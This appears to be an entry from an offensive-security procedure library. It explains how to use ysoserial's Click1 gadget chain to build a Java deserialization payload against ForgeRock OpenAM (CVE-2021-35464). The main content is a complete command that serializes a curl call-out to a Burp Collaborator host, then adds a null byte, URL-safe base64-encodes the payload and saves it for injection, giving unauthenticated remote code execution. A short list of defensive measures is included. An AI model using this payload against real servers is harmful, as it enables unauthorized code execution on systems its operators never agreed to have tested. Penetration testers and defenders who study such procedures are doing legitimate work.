---
id: proc-uuid-002
tags:
  - rce
  - java-deserialization
  - payload-generation
type: procedure
tools:
  - '[[tools/Ysoserial]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/java-ysoserial-generate-payload]]'
verified: false
platforms:
  - Linux
  - Java
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:31:31.134Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Generate-Deserialization-Payload-with-Ysoserial-for-RCE

## Summary

This procedure uses ysoserial to generate a serialized Java payload exploiting the Click1 gadget chain, encoding it in URL-safe base64 for injection into the ForgeRock OpenAM endpoint, enabling RCE via command execution.

## Description

The payload is crafted to execute a curl command to a Burp Collaborator endpoint upon deserialization by the vulnerable Jato framework in OpenAM. The process involves running Java with ysoserial, prepending a null byte, base64 encoding, converting to URL-safe format, removing padding and newlines, and saving to a file. This targets CVE-2021-35464, allowing unauthenticated attackers to run arbitrary commands on the server.

## Requirements

1. Downloaded ysoserial JAR (from previous procedure)
2. Java runtime environment
3. Burp Collaborator instance for outbound connection testing
4. Linux shell with base64 and tr utilities

## Defense

Defensive measures and detection strategies:

- Validate and restrict deserialized objects in Java applications using libraries like NotSoSerial
- Monitor for anomalous Java processes spawning network tools like curl
- Implement web application firewalls (WAF) to detect base64 payloads in query parameters
- Log and alert on deserialization attempts in application logs

## Objectives

1. Create a functional RCE payload using Click1 gadget
2. Encode payload for safe transmission in HTTP parameters
3. Prepare for injection to confirm outbound connections

## Instructions

### Step 1: Execute Ysoserial for Payload Generation

**Context**: Run ysoserial to serialize the gadget chain with the desired command, then process the output for web-safe encoding.

**Command** ([[commands/java-ysoserial-generate-payload]]):
```bash
java -jar ysoserial-master-SNAPSHOT.jar Click1 "curl https://g0h7qcjzwzpzdh2ar6b5f9x3puvkj9.burpcollaborator.net" | (echo -ne \x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\n' > payload.txt
```

> This generates the serialized payload, prepends a null byte (\x00), base64 encodes it, converts to URL-safe base64 (replacing /+ with _-), removes padding (=) and newlines, and saves to payload.txt. Replace the Collaborator URL with your own. Expected output is a single line of encoded string in payload.txt. Verify with `cat payload.txt` – it should be a long base64-like string without breaks.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploitation for Client Execution]]

### Sub-Techniques


## Commands Used

- [[commands/java-ysoserial-generate-payload]]

## Tools Used

- [[tools/Ysoserial]]

## Tags

- rce
- java-deserialization
